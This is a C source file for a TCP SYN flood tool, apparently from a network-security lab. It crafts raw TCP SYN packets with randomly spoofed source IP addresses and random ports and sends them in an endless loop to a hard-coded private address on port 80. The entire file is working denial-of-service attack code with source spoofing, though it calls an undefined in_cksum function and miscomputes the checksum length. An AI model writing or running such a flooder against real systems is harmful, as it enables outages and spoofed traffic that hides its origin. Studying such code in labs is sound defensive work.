#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define DEST_IP "192.168.100.23"
#define DEST_PORT 80
#define PACKET_LEN 1500

struct ipheader {
    unsigned char ip_vhl;
    unsigned char ip_tos;
    unsigned short ip_len;
    unsigned short ip_id;
    unsigned short ip_off;
    unsigned char ip_ttl;
    unsigned char ip_p;
    unsigned short ip_sum;
    struct in_addr ip_src;
    struct in_addr ip_dst;
};

struct tcpheader {
    u_short tcp_sport;
    u_short tcp_dport;
    u_int tcp_seq;
    u_int tcp_ack;
    u_char tcp_offx2;
    #define TH_OFF(th)(((th) ->tcp_offx2 & 0xf0) >> 4)
    u_char tcp_flags;
    #define TH_FIN 0x01
    #define TH_SYN 0x02
    #define TH_RST 0x04
    #define TH_PUSH 0x08
    #define TH_ACK 0x10
    #define TH_URG 0x20
    #define TH_ECE 0x40
    #define TH_CWR 0x80
    #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short tcp_win;
    u_short tcp_sum;
    u_short tcp_urp;
};

u_short calculate_tcp_checksum(struct ipheader *ip);
void send_raw_ip_packet(struct ipheader *ip);

int main() {
    char buffer[PACKET_LEN];
    struct ipheader *ip = (struct ipheader *)buffer;
    struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));

    srand(time(0));

    while (1) {
        memset(buffer, 0, PACKET_LEN);

        tcp->tcp_sport = htons(rand());
        tcp->tcp_dport = htons(DEST_PORT);
        tcp->tcp_seq = htonl(rand());
        tcp->tcp_offx2 = 0x50;
        tcp->tcp_flags = TH_SYN;
        tcp->tcp_win = htons(20000);
        tcp->tcp_sum = 0;

        ip->ip_vhl = 0x45;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
        ip->ip_id = htons(54321);
        ip->ip_off = 0;
        ip->ip_ttl = 50;
        ip->ip_p = IPPROTO_TCP;
        ip->ip_sum = 0; // Calculated later
        ip->ip_src.s_addr = rand();
        ip->ip_dst.s_addr = inet_addr(DEST_IP);

        tcp->tcp_sum = calculate_tcp_checksum(ip);

        send_raw_ip_packet(ip);

        sleep(1);
    }

    return 0;
}

struct pseudo_tcp {
    unsigned int saddr;
    unsigned int daddr;
    unsigned char mbz;
    unsigned char ptcl;
    unsigned short tcpl;
    struct tcpheader tcp;
    char payload[1500];
};

u_short calculate_tcp_checksum(struct ipheader *ip) {
    struct tcpheader *tcp = (struct tcpheader *)((u_char *)ip + sizeof(struct ipheader));

    int tcp_len = ntohs(ip->ip_len) - sizeof(struct ipheader);

    // Pseudo TCP header for the checksum computation
    struct pseudo_tcp p_tcp;
    memset(&p_tcp, 0, sizeof(struct pseudo_tcp));

    p_tcp.saddr = ip->ip_src.s_addr;
    p_tcp.daddr = ip->ip_dst.s_addr;
    p_tcp.mbz = 0;
    p_tcp.ptcl = IPPROTO_TCP;
    p_tcp.tcpl = htons(tcp_len);
    memcpy(&p_tcp.tcp, tcp, tcp_len);

    // Calculate TCP checksum using the pseudo header
    return (unsigned short)in_cksum((unsigned short *)&p_tcp, tcp_len + sizeof(struct pseudo_tcp));
}


void send_raw_ip_packet(struct ipheader* ip) {
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return;
    }

    // Step 2: Set socket option.
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("setsockopt");
        close(sock);
        return;
    }

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr.s_addr = ip->ip_dst.s_addr;

    // Step 4: Send the packet out.
    if (sendto(sock, ip, ntohs(ip->ip_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
        perror("sendto");
    }

    close(sock);
}
